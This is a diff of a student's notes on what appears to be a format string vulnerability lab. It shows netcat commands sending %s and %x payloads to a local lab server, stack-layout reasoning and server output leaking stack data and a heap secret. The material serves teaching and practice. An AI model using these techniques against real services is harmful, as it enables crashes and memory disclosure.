@@ -68,34 +68,11 @@
     server-10.9.0.5 | (^_^)(^_^) Returned properly (^_^)(^_^)
     ```
 - our goal for this task is to provide an input that makes the program crash (i.e., "Returned properly" is not printed out)
-    - if we try `echo %d | nc 10.9.0.5 9090`, a value will be printed out
-        ```
-        server-10.9.0.5 | The target variable's value (before): 0x11223344
-        287454020   <--- where does this come from
-        server-10.9.0.5 | The target variable's value (after): 0x11223344
-        ```
-    - but if we use `%x` instead, this value becomes `11223344`, i.e., the target variable's value, the reason is that before we call `printf(msg)`, the program prints the value of `target`, and after the previous `printf` returns, its parameter `target` remains in the stack, the only problem is that when call `printf("The target variable's value (before): %x", target)`, it first pushes `target`, then the format string, so when it returns, the top of the stack should be the format string, not `target`, to figure out why `printf("%x")` skips the address of `"The target variable's value (before): %x"` and prints out `target`, I wrote a simple program and debugged it
-        - core code of the program
-            ```
-            char buffer[500];
-            scanf("%s", buffer);
-            printf("%d", 8);
-            printf(buffer);
-            ```
-        - check the printout, `printf(buffer)` prints out `8`, this is exactly what we expect
-            ```
-            $ gcc -m32 -o test test.c
-            $ ./test
-            8   <---- input for scanf()
-            88  <---- output
-            ```
-        - use `gdb -q ./test` to debug it and see what happens
-        
     - try `echo %s | nc 10.9.0.5 9090`
         ```
         ...
         server-10.9.0.5 | The target variable's value (before): 0x11223344
-        (no more info printed out)
+        (No more info printed out)
         ```
         - the program is crashed
 ## Task 2: Printing Out the Server Program's Memory
@@ -104,11 +81,46 @@
 
 ### Task 2.A: Stack Data
 - how many `%x` format specifiers do you need to get the program to print out the first four bytes of your input
+    - we construct an input `"******** %s %s %s ... %s %x"`, to make it easier to find the first 4 bytes in the printout info of the server container, make the first 4 bytes `0x77777777`, construct the payload using a python program `task2A_payload.py`
+    - the stack layout when calling `printf(msg)`
+            ```
+            High Memory Addresses
+            |          +--------------------------+     
+            |          |           ...            |
+            |          +--------------------------+
+            |          |        0x77777777        |
+            |          |--------------------------| <---- address of input buffer 
+            |          |           ...            |
+            |          |--------------------------| 
+            |          | address of input buffer  |
+            |          |--------------------------| <---- first argument of printf()
+            |          |      return address      |
+            |          |--------------------------|
+            |          |     previous ebp/rbp     |
+            |          |--------------------------|
+            |          |           ...            |    
+            |          +--------------------------+
+            |          |       Unused Space       |
+            |          +--------------------------+
+            Low Memory Addresses
+            ```
+    - when executing `printf()`, it will fetch a number of hexadecimal numbers from higher addresses, and if there is enough `%x` in the format string, it will finally fetch and print out the first 4 bytes in the input buffer, `0x77777777`
+    - from the information printed out by the server, we can know the address of input buffer is `0xffffd240`, the frame pointer when in `myprintf()` is `0xffffd168`, so there will be **approximately** `216` bytes before reaching first 4 bytes of our input, each `%x` prints out 4 bytes, so the number of `%x` is around `54`, the precise number can be determined through experimentation, in my case, the number is `64`, and I can get the following output from the server (to make the output looks better, I acutally used `"%.8x"` in the payload)
+        ```
+        server-10.9.0.5 | wwww11223344 00001000 08049db5 080e5320 080e61c0 ffffd240 ffffd168 080e62d4 080e5000 ffffd208 08049f7e ffffd240 00000000 00000064 08049f47 080e5320 000005dc 000005dc ffffd240 ffffd240 080e9720 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 44371700 080e5000 080e5000 ffffd828 08049eff ffffd240 000005dc 000005dc 080e5320 00000000 00000000 00000000 ffffd8f4 00000000 00000000 00000000 000005dc 77777777 The target variable's value (after):  0x11223344
+        server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
+        ```
 
 ### Task 2.B: Heap Data
 - there is a secret message (a string) stored in the heap area, and the server prints out its address, our objective is to print out this secrete message
-    - we need to place the address (in the binary form) of the secret message in the format string
-
+    - te address of the secret message is `0x080b4008`, we need to place the address (in the binary form) of the secret message in the format string, if we still use `%x`, the container will only print out the address itself, not the content in that address, as the secret message is a string, use `%s`
+    - in task `2.A`, we have already figured out the 64th placeholder specifier is for the first 4 bytes of our input, set this `%x` to `%s`
+    - the output
+        ```
+        server-10.9.0.5 | wwww11223344 00001000 08049db5 080e5320 080e61c0 ffffd240 ffffd168 080e62d4 080e5000 ffffd208 08049f7e ffffd240 00000000 00000064 08049f47 080e5320 000005dc 000005dc ffffd240 ffffd240 080e9720 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 44371700 080e5000 080e5000 ffffd828 08049eff ffffd240 000005dc 000005dc 080e5320 00000000 00000000 00000000 ffffd8f4 00000000 00000000 00000000 000005dc A secret message
+        server-10.9.0.5 | The target variable's value (after):  0x11223344
+        server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
+        ```
 
 ## Task 3: Modifying the Server Program's Memory
 
